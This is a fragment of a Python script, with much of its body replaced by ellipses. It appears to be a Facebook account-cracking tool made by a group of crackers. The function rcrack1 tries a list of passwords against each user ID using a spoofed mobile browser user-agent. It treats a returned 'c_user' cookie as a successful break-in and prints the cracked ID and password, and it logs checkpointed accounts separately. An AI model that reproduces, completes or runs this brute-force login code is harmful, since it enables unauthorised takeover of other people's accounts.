#SC MAKED BY Pshyco Hawladar 🤣 and Fuked By FB-KING 🙄
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mPyscho\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[Pshyco-OK💛] {uid}|{ps}")
                ...
                print(f"\x1b[38;5;196m[Pshyco-CP🔒] {uid}|{ps}")
